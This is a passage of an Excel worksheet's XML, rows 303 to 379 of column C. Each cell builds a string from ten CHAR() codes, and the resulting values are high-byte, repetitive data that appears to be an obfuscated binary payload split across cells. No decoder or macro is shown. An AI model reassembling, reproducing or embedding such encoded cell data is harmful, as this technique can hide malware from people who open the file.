        <f>CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)</f>
        <v>!¥ûÏ&gt;±ÖÈ!¥</v>
      </c>
    </row>
    <row r="304" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C304" t="str">
        <f>CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)</f>
        <v>ûÏ&gt;±ÖÈ!¥ûÏ</v>
      </c>
    </row>
    <row r="305" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C305" t="str">
        <f>CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)</f>
        <v>&gt;±ÖÈ!¥ûÏ&gt;±</v>
      </c>
    </row>
    <row r="306" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C306" t="str">
        <f>CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(21)&amp;CHAR(201)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)</f>
        <v>ÖÈ!_x0015_ÉÏ&gt;±ÖÈ</v>
      </c>
    </row>
    <row r="307" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C307" t="str">
        <f>CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(237)</f>
        <v>!¥ûÏ&gt;±ÖÈ!í</v>
      </c>
    </row>
    <row r="308" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C308" t="str">
        <f>CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(179)&amp;CHAR(214)&amp;CHAR(205)&amp;CHAR(33)&amp;CHAR(53)&amp;CHAR(218)&amp;CHAR(207)</f>
        <v>ûÏ&gt;³ÖÍ!5ÚÏ</v>
      </c>
    </row>
    <row r="309" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C309" t="str">
        <f>CHAR(62)&amp;CHAR(105)&amp;CHAR(198)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(164)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(179)</f>
        <v>&gt;iÆÈ!¤ûÏ&gt;³</v>
      </c>
    </row>
    <row r="310" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C310" t="str">
        <f>CHAR(214)&amp;CHAR(200)&amp;CHAR(39)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)</f>
        <v>ÖÈ'¥ûÏ&gt;±ÖÈ</v>
      </c>
    </row>
    <row r="311" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C311" t="str">
        <f>CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)</f>
        <v>!¥ûÏ&gt;±ÖÈ!¥</v>
      </c>
    </row>
    <row r="312" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C312" t="str">
        <f>CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)</f>
        <v>ûÏ&gt;±ÖÈ!¥ûÏ</v>
      </c>
    </row>
    <row r="313" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C313" t="str">
        <f>CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)</f>
        <v>&gt;±ÖÈ!¥ûÏ&gt;±</v>
      </c>
    </row>
    <row r="314" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C314" t="str">
        <f>CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)</f>
        <v>ÖÈ!¥ûÏ&gt;±ÖÈ</v>
      </c>
    </row>
    <row r="315" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C315" t="str">
        <f>CHAR(33)&amp;CHAR(187)&amp;CHAR(249)&amp;CHAR(231)&amp;CHAR(55)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(194)&amp;CHAR(11)&amp;CHAR(182)</f>
        <v>!»ùç7±ÖÂ_x000B_¶</v>
      </c>
    </row>
    <row r="316" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C316" t="str">
        <f>CHAR(203)&amp;CHAR(197)&amp;CHAR(62)&amp;CHAR(78)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(164)&amp;CHAR(251)&amp;CHAR(207)</f>
        <v>ËÅ&gt;NÖÈ!¤ûÏ</v>
      </c>
    </row>
    <row r="317" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C317" t="str">
        <f>CHAR(47)&amp;CHAR(195)&amp;CHAR(215)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(213)&amp;CHAR(240)&amp;CHAR(239)&amp;CHAR(92)&amp;CHAR(176)</f>
        <v>/Ã×È!Õðï\°</v>
      </c>
    </row>
    <row r="318" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C318" t="str">
        <f>CHAR(214)&amp;CHAR(200)&amp;CHAR(172)&amp;CHAR(167)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(63)&amp;CHAR(148)&amp;CHAR(6)&amp;CHAR(140)</f>
        <v>ÖÈ¬§ûÏ?”_x0006_Œ</v>
      </c>
    </row>
    <row r="319" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C319" t="str">
        <f>CHAR(33)&amp;CHAR(165)&amp;CHAR(255)&amp;CHAR(231)&amp;CHAR(60)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(194)&amp;CHAR(43)&amp;CHAR(215)</f>
        <v>!¥ÿç&lt;±ÖÂ+×</v>
      </c>
    </row>
    <row r="320" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C320" t="str">
        <f>CHAR(248)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(193)&amp;CHAR(221)&amp;CHAR(218)&amp;CHAR(35)&amp;CHAR(91)&amp;CHAR(238)&amp;CHAR(201)</f>
        <v>øÏ&gt;ÁÝÚ#[îÉ</v>
      </c>
    </row>
    <row r="321" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C321" t="str">
        <f>CHAR(62)&amp;CHAR(177)&amp;CHAR(212)&amp;CHAR(218)&amp;CHAR(34)&amp;CHAR(91)&amp;CHAR(238)&amp;CHAR(202)&amp;CHAR(62)&amp;CHAR(177)</f>
        <v>&gt;±ÔÚ"[îÊ&gt;±</v>
      </c>
    </row>
    <row r="322" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C322" t="str">
        <f>CHAR(212)&amp;CHAR(207)&amp;CHAR(53)&amp;CHAR(219)&amp;CHAR(248)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(187)&amp;CHAR(168)&amp;CHAR(203)</f>
        <v>ÔÏ5ÛøÏ&gt;»¨Ë</v>
      </c>
    </row>
    <row r="323" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C323" t="str">
        <f>CHAR(33)&amp;CHAR(165)&amp;CHAR(241)&amp;CHAR(217)&amp;CHAR(30)&amp;CHAR(181)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(41)&amp;CHAR(219)</f>
        <v>!¥ñÙ_x001E_µÖÈ)Û</v>
      </c>
    </row>
    <row r="324" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C324" t="str">
        <f>CHAR(248)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(187)&amp;CHAR(194)&amp;CHAR(218)&amp;CHAR(35)&amp;CHAR(183)&amp;CHAR(248)&amp;CHAR(231)</f>
        <v>øÏ&gt;»ÂÚ#·øç</v>
      </c>
    </row>
    <row r="325" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C325" t="str">
        <f>CHAR(54)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(206)&amp;CHAR(50)&amp;CHAR(161)&amp;CHAR(233)&amp;CHAR(204)&amp;CHAR(69)&amp;CHAR(149)</f>
        <v>6±ÖÎ2¡éÌE•</v>
      </c>
    </row>
    <row r="326" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C326" t="str">
        <f>CHAR(214)&amp;CHAR(200)&amp;CHAR(37)&amp;CHAR(219)&amp;CHAR(248)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(187)&amp;CHAR(208)&amp;CHAR(70)</f>
        <v>ÖÈ%ÛøÏ&gt;»ÐF</v>
      </c>
    </row>
    <row r="327" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C327" t="str">
        <f>CHAR(72)&amp;CHAR(219)&amp;CHAR(250)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(181)&amp;CHAR(168)&amp;CHAR(203)&amp;CHAR(33)&amp;CHAR(165)</f>
        <v>HÛúÏ&gt;µ¨Ë!¥</v>
      </c>
    </row>
    <row r="328" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C328" t="str">
        <f>CHAR(255)&amp;CHAR(231)&amp;CHAR(56)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(206)&amp;CHAR(50)&amp;CHAR(160)&amp;CHAR(133)&amp;CHAR(204)</f>
        <v>ÿç8±ÖÎ2 …Ì</v>
      </c>
    </row>
    <row r="329" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C329" t="str">
        <f>CHAR(62)&amp;CHAR(177)&amp;CHAR(220)&amp;CHAR(219)&amp;CHAR(39)&amp;CHAR(183)&amp;CHAR(248)&amp;CHAR(180)&amp;CHAR(26)&amp;CHAR(177)</f>
        <v>&gt;±ÜÛ'·ø´_x001A_±</v>
      </c>
    </row>
    <row r="330" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C330" t="str">
        <f>CHAR(214)&amp;CHAR(204)&amp;CHAR(48)&amp;CHAR(160)&amp;CHAR(253)&amp;CHAR(201)&amp;CHAR(176)&amp;CHAR(216)&amp;CHAR(196)&amp;CHAR(206)</f>
        <v>ÖÌ0 ýÉ°ØÄÎ</v>
      </c>
    </row>
    <row r="331" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C331" t="str">
        <f>CHAR(9)&amp;CHAR(161)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(56)&amp;CHAR(162)&amp;CHAR(209)&amp;CHAR(222)&amp;CHAR(50)&amp;CHAR(173)</f>
        <v xml:space="preserve">	¡ûÏ8¢ÑÞ2­</v>
      </c>
    </row>
    <row r="332" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C332" t="str">
        <f>CHAR(233)&amp;CHAR(204)&amp;CHAR(69)&amp;CHAR(149)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(37)&amp;CHAR(180)&amp;CHAR(254)&amp;CHAR(201)</f>
        <v>éÌE•ÖÈ%´þÉ</v>
      </c>
    </row>
    <row r="333" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C333" t="str">
        <f>CHAR(176)&amp;CHAR(216)&amp;CHAR(168)&amp;CHAR(202)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(255)&amp;CHAR(221)&amp;CHAR(54)&amp;CHAR(153)</f>
        <v>°Ø¨Ê!¥ÿÝ6™</v>
      </c>
    </row>
    <row r="334" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C334" t="str">
        <f>CHAR(209)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(163)&amp;CHAR(232)&amp;CHAR(200)&amp;CHAR(44)&amp;CHAR(178)&amp;CHAR(173)&amp;CHAR(238)</f>
        <v>ÑÈ!£èÈ,²­î</v>
      </c>
    </row>
    <row r="335" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C335" t="str">
        <f>CHAR(33)&amp;CHAR(165)&amp;CHAR(255)&amp;CHAR(231)&amp;CHAR(58)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(194)&amp;CHAR(50)&amp;CHAR(172)</f>
        <v>!¥ÿç:±ÖÂ2¬</v>
      </c>
    </row>
    <row r="336" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C336" t="str">
        <f>CHAR(234)&amp;CHAR(198)&amp;CHAR(81)&amp;CHAR(180)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(43)&amp;CHAR(182)&amp;CHAR(241)&amp;CHAR(208)</f>
        <v>êÆQ´ÖÈ+¶ñÐ</v>
      </c>
    </row>
    <row r="337" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C337" t="str">
        <f>CHAR(46)&amp;CHAR(167)&amp;CHAR(199)&amp;CHAR(194)&amp;CHAR(55)&amp;CHAR(202)&amp;CHAR(253)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(187)</f>
        <v>.§ÇÂ7ÊýÏ&gt;»</v>
      </c>
    </row>
    <row r="338" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C338" t="str">
        <f>CHAR(185)&amp;CHAR(207)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(241)&amp;CHAR(231)&amp;CHAR(61)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(206)</f>
        <v>¹Ï!¥ñç=±ÖÎ</v>
      </c>
    </row>
    <row r="339" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C339" t="str">
        <f>CHAR(50)&amp;CHAR(174)&amp;CHAR(234)&amp;CHAR(202)&amp;CHAR(47)&amp;CHAR(186)&amp;CHAR(168)&amp;CHAR(203)&amp;CHAR(33)&amp;CHAR(165)</f>
        <v>2®êÊ/º¨Ë!¥</v>
      </c>
    </row>
    <row r="340" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C340" t="str">
        <f>CHAR(241)&amp;CHAR(231)&amp;CHAR(59)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(206)&amp;CHAR(50)&amp;CHAR(169)&amp;CHAR(233)&amp;CHAR(204)</f>
        <v>ñç;±ÖÎ2©éÌ</v>
      </c>
    </row>
    <row r="341" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C341" t="str">
        <f>CHAR(69)&amp;CHAR(148)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(37)&amp;CHAR(182)&amp;CHAR(246)&amp;CHAR(222)&amp;CHAR(51)&amp;CHAR(153)</f>
        <v>E”ÖÈ%¶öÞ3™</v>
      </c>
    </row>
    <row r="342" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C342" t="str">
        <f>CHAR(223)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(163)&amp;CHAR(221)&amp;CHAR(229)&amp;CHAR(92)&amp;CHAR(145)&amp;CHAR(214)&amp;CHAR(216)</f>
        <v>ßÈ!£Ýå\‘ÖØ</v>
      </c>
    </row>
    <row r="343" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C343" t="str">
        <f>CHAR(33)&amp;CHAR(165)&amp;CHAR(123)&amp;CHAR(206)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(210)&amp;CHAR(215)&amp;CHAR(1)&amp;CHAR(37)</f>
        <v>!¥{Î&gt;±Ò×_x0001_%</v>
      </c>
    </row>
    <row r="344" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C344" t="str">
        <f>CHAR(249)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(181)&amp;CHAR(204)&amp;CHAR(72)&amp;CHAR(34)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(203)</f>
        <v>ùÏ&gt;µÌH"¥ûË</v>
      </c>
    </row>
    <row r="345" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C345" t="str">
        <f>CHAR(20)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)</f>
        <v>_x0014_±ÖÈ!¥ûÏ&gt;±</v>
      </c>
    </row>
    <row r="346" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C346" t="str">
        <f>CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(231)&amp;CHAR(168)&amp;CHAR(133)&amp;CHAR(124)&amp;CHAR(176)&amp;CHAR(214)&amp;CHAR(201)</f>
        <v>ÖÈ!ç¨…|°ÖÉ</v>
      </c>
    </row>
    <row r="347" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C347" t="str">
        <f>CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(189)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(211)</f>
        <v>!¥ûÏ&gt;½ÖÈ!Ó</v>
      </c>
    </row>
    <row r="348" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C348" t="str">
        <f>CHAR(207)&amp;CHAR(225)&amp;CHAR(14)&amp;CHAR(159)&amp;CHAR(229)&amp;CHAR(248)&amp;CHAR(18)&amp;CHAR(148)&amp;CHAR(194)&amp;CHAR(207)</f>
        <v>Ïá_x000E_Ÿåø_x0012_”ÂÏ</v>
      </c>
    </row>
    <row r="349" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C349" t="str">
        <f>CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(205)&amp;CHAR(33)&amp;CHAR(201)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(141)</f>
        <v>&gt;±ÖÍ!ÉûÏ&gt;</v>
      </c>
    </row>
    <row r="350" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C350" t="str">
        <f>CHAR(208)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(134)&amp;CHAR(133)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(25)&amp;CHAR(208)&amp;CHAR(200)</f>
        <v>ÐÈ!†…Ï&gt;_x0019_ÐÈ</v>
      </c>
    </row>
    <row r="351" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C351" t="str">
        <f>CHAR(33)&amp;CHAR(173)&amp;CHAR(243)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(146)&amp;CHAR(133)&amp;CHAR(188)&amp;CHAR(83)&amp;CHAR(204)</f>
        <v>!­óÏ&gt;’…¼SÌ</v>
      </c>
    </row>
    <row r="352" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C352" t="str">
        <f>CHAR(149)&amp;CHAR(168)&amp;CHAR(77)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(21)&amp;CHAR(245)&amp;CHAR(207)</f>
        <v>•¨M±ÖÈ!_x0015_õÏ</v>
      </c>
    </row>
    <row r="353" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C353" t="str">
        <f>CHAR(62)&amp;CHAR(241)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(134)&amp;CHAR(174)&amp;CHAR(156)&amp;CHAR(62)&amp;CHAR(65)</f>
        <v>&gt;ñÖÈ!†®œ&gt;A</v>
      </c>
    </row>
    <row r="354" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C354" t="str">
        <f>CHAR(216)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(181)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(146)&amp;CHAR(145)&amp;CHAR(157)</f>
        <v>ØÈ!µûÏ&gt;’‘</v>
      </c>
    </row>
    <row r="355" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C355" t="str">
        <f>CHAR(104)&amp;CHAR(225)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(217)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(125)</f>
        <v>háûÏ&gt;±ÙÈ!}</v>
      </c>
    </row>
    <row r="356" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C356" t="str">
        <f>CHAR(250)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(146)&amp;CHAR(148)&amp;CHAR(164)&amp;CHAR(78)&amp;CHAR(199)&amp;CHAR(251)&amp;CHAR(207)</f>
        <v>úÏ&gt;’”¤NÇûÏ</v>
      </c>
    </row>
    <row r="357" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C357" t="str">
        <f>CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(167)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(46)&amp;CHAR(230)</f>
        <v>&gt;±ÖÈ!§ûÏ.æ</v>
      </c>
    </row>
    <row r="358" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C358" t="str">
        <f>CHAR(11)&amp;CHAR(202)&amp;CHAR(21)&amp;CHAR(172)&amp;CHAR(249)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(44)&amp;CHAR(201)</f>
        <v>_x000B_Ê_x0015_¬ùÏ&gt;±,É</v>
      </c>
    </row>
    <row r="359" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C359" t="str">
        <f>CHAR(18)&amp;CHAR(165)&amp;CHAR(237)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(176)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(170)</f>
        <v>_x0012_¥íÏ&gt;°ÖÈ!ª</v>
      </c>
    </row>
    <row r="360" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C360" t="str">
        <f>CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(184)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(225)&amp;CHAR(251)&amp;CHAR(207)</f>
        <v>ûÏ&gt;¸ÖÈ!áûÏ</v>
      </c>
    </row>
    <row r="361" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C361" t="str">
        <f>CHAR(62)&amp;CHAR(186)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(132)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(186)</f>
        <v>&gt;ºÖÈ!„ûÏ&gt;º</v>
      </c>
    </row>
    <row r="362" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C362" t="str">
        <f>CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(130)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(183)&amp;CHAR(214)&amp;CHAR(200)</f>
        <v>ÖÈ!‚ûÏ&gt;·ÖÈ</v>
      </c>
    </row>
    <row r="363" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C363" t="str">
        <f>CHAR(33)&amp;CHAR(164)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(176)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(164)</f>
        <v>!¤ûÏ&gt;°ÖÈ!¤</v>
      </c>
    </row>
    <row r="364" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C364" t="str">
        <f>CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(176)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(173)&amp;CHAR(251)&amp;CHAR(207)</f>
        <v>ûÏ&gt;°ÖÈ!­ûÏ</v>
      </c>
    </row>
    <row r="365" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C365" t="str">
        <f>CHAR(62)&amp;CHAR(176)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(164)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(179)</f>
        <v>&gt;°ÖÈ!¤ûÏ&gt;³</v>
      </c>
    </row>
    <row r="366" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C366" t="str">
        <f>CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(163)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(36)</f>
        <v>ÖÈ!£ûÏ&gt;±Ö$</v>
      </c>
    </row>
    <row r="367" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C367" t="str">
        <f>CHAR(38)&amp;CHAR(164)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(206)&amp;CHAR(33)&amp;CHAR(148)</f>
        <v>&amp;¤ûÏ&gt;±ÖÎ!”</v>
      </c>
    </row>
    <row r="368" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C368" t="str">
        <f>CHAR(255)&amp;CHAR(132)&amp;CHAR(58)&amp;CHAR(183)&amp;CHAR(214)&amp;CHAR(169)&amp;CHAR(37)&amp;CHAR(195)&amp;CHAR(255)&amp;CHAR(201)</f>
        <v>ÿ„:·Ö©%ÃÿÉ</v>
      </c>
    </row>
    <row r="369" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C369" t="str">
        <f>CHAR(62)&amp;CHAR(122)&amp;CHAR(210)&amp;CHAR(18)&amp;CHAR(37)&amp;CHAR(163)&amp;CHAR(251)&amp;CHAR(197)&amp;CHAR(59)&amp;CHAR(215)</f>
        <v>&gt;zÒ_x0012_%£ûÅ;×</v>
      </c>
    </row>
    <row r="370" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C370" t="str">
        <f>CHAR(210)&amp;CHAR(206)&amp;CHAR(33)&amp;CHAR(181)&amp;CHAR(254)&amp;CHAR(169)&amp;CHAR(58)&amp;CHAR(183)&amp;CHAR(214)&amp;CHAR(235)</f>
        <v>ÒÎ!µþ©:·Öë</v>
      </c>
    </row>
    <row r="371" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C371" t="str">
        <f>CHAR(36)&amp;CHAR(195)&amp;CHAR(255)&amp;CHAR(197)&amp;CHAR(62)&amp;CHAR(158)&amp;CHAR(211)&amp;CHAR(255)&amp;CHAR(36)&amp;CHAR(175)</f>
        <v>$ÃÿÅ&gt;žÓÿ$¯</v>
      </c>
    </row>
    <row r="372" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C372" t="str">
        <f>CHAR(251)&amp;CHAR(150)&amp;CHAR(59)&amp;CHAR(134)&amp;CHAR(211)&amp;CHAR(194)&amp;CHAR(33)&amp;CHAR(35)&amp;CHAR(254)&amp;CHAR(248)</f>
        <v>û–;†ÓÂ!#þø</v>
      </c>
    </row>
    <row r="373" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C373" t="str">
        <f>CHAR(59)&amp;CHAR(183)&amp;CHAR(214)&amp;CHAR(83)&amp;CHAR(36)&amp;CHAR(195)&amp;CHAR(255)&amp;CHAR(201)&amp;CHAR(62)&amp;CHAR(192)</f>
        <v>;·ÖS$ÃÿÉ&gt;À</v>
      </c>
    </row>
    <row r="374" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C374" t="str">
        <f>CHAR(209)&amp;CHAR(174)&amp;CHAR(37)&amp;CHAR(163)&amp;CHAR(251)&amp;CHAR(183)&amp;CHAR(57)&amp;CHAR(107)&amp;CHAR(210)&amp;CHAR(206)</f>
        <v>Ñ®%£û·9kÒÎ</v>
      </c>
    </row>
    <row r="375" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C375" t="str">
        <f>CHAR(33)&amp;CHAR(58)&amp;CHAR(252)&amp;CHAR(169)&amp;CHAR(58)&amp;CHAR(183)&amp;CHAR(214)&amp;CHAR(108)&amp;CHAR(38)&amp;CHAR(195)</f>
        <v>!:ü©:·Öl&amp;Ã</v>
      </c>
    </row>
    <row r="376" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C376" t="str">
        <f>CHAR(255)&amp;CHAR(201)&amp;CHAR(62)&amp;CHAR(116)&amp;CHAR(209)&amp;CHAR(18)&amp;CHAR(37)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)</f>
        <v>ÿÉ&gt;tÑ_x0012_%¥ûÏ</v>
      </c>
    </row>
    <row r="377" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C377" t="str">
        <f>CHAR(62)&amp;CHAR(176)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(206)&amp;CHAR(62)&amp;CHAR(176)</f>
        <v>&gt;°ÖÈ!¥ûÎ&gt;°</v>
      </c>
    </row>
    <row r="378" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C378" t="str">
        <f>CHAR(214)&amp;CHAR(201)&amp;CHAR(33)&amp;CHAR(181)&amp;CHAR(251)&amp;CHAR(197)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(229)</f>
        <v>ÖÉ!µûÅ&gt;±Öå</v>
      </c>
    </row>
    <row r="379" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C379" t="str">
